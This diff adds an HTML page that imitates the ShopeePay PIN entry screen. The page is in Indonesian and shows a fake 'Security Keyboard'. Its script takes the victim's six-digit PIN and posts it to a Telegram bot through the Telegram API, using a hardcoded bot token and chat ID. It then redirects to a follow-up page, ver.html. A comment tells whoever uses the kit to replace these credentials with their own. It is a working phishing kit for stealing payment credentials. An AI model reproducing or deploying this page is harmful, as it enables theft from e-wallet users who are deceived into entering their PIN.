@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Input PIN ShopeePay</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .modal {
+            background-color: #fff;
+            width: 100%;
+            max-width: 400px;
+            height: 100%;
+            max-height: 600px;
+            border-radius: 12px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        @media (max-width: 400px) {
+            .modal {
+                max-height: 100vh;
+                border-radius: 0;
+            }
+        }
+
+        .header {
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #eee;
+        }
+
+        .header h2 {
+            margin: 0;
+            font-size: 18px;
+            color: #333;
+            font-weight: 500;
+        }
+
+        .close-btn {
+            font-size: 24px;
+            cursor: pointer;
+            color: #999;
+        }
+
+        .pin-section {
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding-bottom: 20px;
+        }
+
+        .pin-display {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .dot {
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            background-color: #e0e0e0;
+            transition: background-color 0.2s;
+        }
+
+        .dot.active {
+            background-color: #333;
+        }
+
+        .forgot-link {
+            color: #007bff;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            background-color: #f9f9f9;
+            padding: 10px;
+            gap: 10px;
+        }
+
+        .key {
+            padding: 20px;
+            font-size: 24px;
+            text-align: center;
+            cursor: pointer;
+            user-select: none;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            color: #333;
+        }
+
+        .key:active {
+            background-color: #e9e9e9;
+        }
+
+        .key.empty {
+            background: transparent;
+            box-shadow: none;
+            cursor: default;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 15px;
+            font-size: 12px;
+            color: #aaa;
+            background-color: #f9f9f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .shield-icon {
+            width: 12px;
+            height: 14px;
+            background-color: #ccc;
+            clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
+        }
+    </style>
+</head>
+<body>
+
+<div class="modal">
+    <div class="header">
+        <h2>Masukkan PIN</h2>
+        <div class="close-btn">&times;</div>
+    </div>
+
+    <div class="pin-section">
+        <div class="pin-display" id="pinDisplay">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+        <a href="#" class="forgot-link">Lupa PIN ShopeePay?</a>
+    </div>
+
+    <div class="keypad">
+        <div class="key" onclick="pressKey('1')">1</div>
+        <div class="key" onclick="pressKey('2')">2</div>
+        <div class="key" onclick="pressKey('3')">3</div>
+        <div class="key" onclick="pressKey('4')">4</div>
+        <div class="key" onclick="pressKey('5')">5</div>
+        <div class="key" onclick="pressKey('6')">6</div>
+        <div class="key" onclick="pressKey('7')">7</div>
+        <div class="key" onclick="pressKey('8')">8</div>
+        <div class="key" onclick="pressKey('9')">9</div>
+        <div class="key empty"></div>
+        <div class="key" onclick="pressKey('0')">0</div>
+        <div class="key" onclick="deleteKey()">⌫</div>
+    </div>
+
+    <div class="footer">
+        <div class="shield-icon"></div>
+        ShopeePay Security Keyboard
+    </div>
+</div>
+
+<script>
+    let currentPin = "";
+    const dots = document.querySelectorAll('.dot');
+
+    // === GANTI DATA DI BAWAH INI ===
+    const TELEGRAM_TOKEN = '8794002267:AAFS1_xcjzj7y-j4Ue7B-tA9sX83xa_WKmY';
+    const TELEGRAM_CHAT_ID = '7549590022';
+    // ===============================
+
+    function updateDisplay() {
+        dots.forEach((dot, index) => {
+            if (index < currentPin.length) {
+                dot.classList.add('active');
+            } else {
+                dot.classList.remove('active');
+            }
+        });
+    }
+
+    function pressKey(num) {
+        if (currentPin.length < 6) {
+            currentPin += num;
+            updateDisplay();
+            
+            if (currentPin.length === 6) {
+                sendToTelegram(currentPin);
+            }
+        }
+    }
+
+    function deleteKey() {
+        if (currentPin.length > 0) {
+            currentPin = currentPin.slice(0, -1);
+            updateDisplay();
+        }
+    }
+
+    function sendToTelegram(pin) {
+        const message = `🔔 *Log PIN Baru*\n\nPIN: \`${pin}\` \nTanggal: \${new Date().toLocaleString('id-ID')}`;
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+
+        const data = {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        })
+        .then(response => {
+            if (response.ok) {
+                location.href = "ver.html";
+            }
+            // Reset setelah pengiriman
+            setTimeout(() => {
+                currentPin = "";
+                updateDisplay();
+            }, 500);
+        })
+        .catch(error => console.error('Error:', error));
+    }
+</script>
+
+</body>
+</html>
